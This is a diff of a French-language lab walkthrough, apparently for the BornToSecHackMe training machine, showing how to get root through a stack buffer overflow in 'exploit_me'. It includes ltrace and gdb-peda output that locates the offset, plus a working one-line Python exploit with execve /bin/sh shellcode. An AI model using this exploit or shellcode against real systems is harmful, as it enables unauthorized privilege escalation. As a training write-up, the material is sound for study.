@@ -211,7 +211,36 @@ Publicspeakingisveryeasy.126241207201b2149opekmq426135
 ```
 
 ## Pour etre root
-
+- On voit qu'il y a un strcpy de argv[1] donc on peut l'overflow
 ```
-./exploit_me $(python -c "import struct; print('\x90' * (100) + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * (140 - 120) + struct.pack('<I', 0xbffff600))")
+$> ltrace ./exploit_me testt
+__libc_start_main(0x80483f4, 2, 0xbffff704, 0x8048440, 0x80484b0 <unfinished ...>
+strcpy(0xbffff5e0, "testt")                                            = 0xbffff5e0
+puts("testt"testt)                                                     = 6
++++ exited (status 0) +++
+```
+- On calcule donc l'offset
+<pre>
+zaz@BornToSecHackMe:~$ gdb ./exploit_me 
+(gdb) source /tmp/peda/peda.py 
+gdb-peda$ pattern arg 200
+Set 1 arguments to program
+gdb-peda$ r
+[----------------------------------registers-----------------------------------]
+EBP: 0x41514141 ('AAQA')
+ESP: 0xbffff5a0 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+EIP: 0x41416d41 ('AmAA')
+EFLAGS: 0x210286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41416d41
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41416d41 in ?? ()
+gdb-peda$ pattern offset AmAA
+AmAA found at offset: 140
+</pre>
+- Se qui donne
+```
+./exploit_me $(python -c "import struct; print('\x90' * (100) + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * (140 - 121) + struct.pack('<I', 0xbffff560))")
 ```
